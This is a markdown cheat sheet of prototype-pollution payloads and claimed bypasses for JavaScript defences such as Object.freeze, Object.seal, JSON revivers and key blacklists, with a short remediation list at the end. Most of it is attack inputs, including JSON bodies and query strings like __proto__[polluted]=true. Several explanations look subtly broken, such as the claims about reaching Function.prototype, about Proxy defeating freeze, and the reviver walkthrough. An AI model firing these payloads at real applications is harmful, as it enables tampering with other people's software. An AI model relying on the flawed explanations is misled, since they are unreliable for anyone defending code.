# Prototype Pollution — Mitigation Bypass

## Summary
Developers often try to mitigate prototype pollution with `Object.freeze`, `Object.seal`, or `Object.create(null)`. These can be bypassed in certain conditions.

## Object.freeze(Object.prototype)

### Resistance
``javascript
Object.freeze(Object.prototype);
// Now: Object.prototype.polluted = "x" fails silently in strict mode
``

### Bypass via constructor.prototype
```javascript
// Object.freeze only freezes the current Object.prototype reference
// But each object's constructor.prototype is the same reference
// Alternative: pollute via Function.prototype

// Pollute Function.prototype instead
{
  "__proto__": {
    "prototype": {
      "polluted": true
    }
  }
}
// If the merge traverses __proto__.prototype, it reaches Function.prototype
```

### Bypass via Reflect.set / Proxy
```javascript
// If the application uses a Proxy wrapper:
const handler = {
  set(target, key, value) {
    // No __proto__ check
    target[key] = value;
    return true;
  }
};

// Merge into a proxied object
const proxy = new Proxy({}, handler);
merge(proxy, JSON.parse('{"__proto__": {"polluted": true}}'));

// Proxy.set is called with key="__proto__", value={polluted: true}
// If set just does target[key] = value, it bypasses freeze
```

## Object.seal(Object.prototype)

Seal prevents adding new properties but allows modifying existing ones.

```javascript
Object.seal(Object.prototype);

// Existing properties (e.g., toString, valueOf) can be overwritten
{
  "__proto__": {
    "toString": "function() { return 'polluted'; }"
  }
}

// This can break type coercion if any code uses == or + with objects
```

## Object.create(null)

Creating objects with no prototype:

```javascript
const safe = Object.create(null);
safe.key = "value";

// These objects are immune to PP
// Bypass: if the code later copies properties to a regular object
const regular = {};
for (const key in safe) {
  regular[key] = safe[key];  // if safe has __proto__ somehow, it propagates
}
```

## Bypass via JSON Parse Reviver

```javascript
// Some apps use a reviver to strip __proto__
const safe = JSON.parse(userInput, (key, value) => {
  if (key === '__proto__') return undefined;
  return value;
});

// But if the reviver only checks the current key:
// Input: {"a": {"__proto__": {"polluted": true}}}
// The reviver sees key="a" first, returns the nested object
// Then sees key="__proto__" — returns undefined
// But the nested object is already created with proto polluted!

// More thorough reviver:
function strictReviver(key, value) {
  if (key === '__proto__' || key === 'constructor') {
    return undefined;
  }
  return value;
}
```

## Bypass via Non-Standard __proto__ Variants

### In Express / URL parsing
```bash
# Some frameworks parse query strings with nested key notation:
?__proto__[polluted]=true

# Check array notation
?__proto__[polluted]=true&__proto__[other]=value

# Check __proto__ on array indices
?__proto__[0]=polluted
```

### In Node.js querystring module
```javascript
const qs = require('querystring');
qs.parse('__proto__[polluted]=true');
// May create a dangerously structured object
```

## Bypassing key blacklists

```javascript
// Blacklist approach:
const blacklist = ['__proto__', 'constructor'];
function safeMerge(target, source) {
  for (const key in source) {
    if (blacklist.includes(key)) continue;
    if (typeof source[key] === 'object') {
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Bypass 1: Use prototype instead of __proto__
// Node.js: { "__proto__": { "a": 1 } }  → target.__proto__.__proto__
// A merge that doesn't recurse into __proto__ but does recurse into prototype...

// Bypass 2: constructor.constructor.prototype
// String: constructor → Function → prototype
// Input: {"constructor": {"prototype": {"polluted": true}}}
```

## Remediation Against These Bypasses

- Use `Object.create(null)` and never copy user-controlled data to regular objects
- Use a schema validator that enforces an allowlist of keys
- Recursively delete `__proto__`, `constructor`, and `prototype` at every nesting level
- Use `Proxy` with a `set` trap that rejects all dangerous keys
- Parse JSON with a reviver that checks `this` context for parent keys
- Use immutable data structures where possible
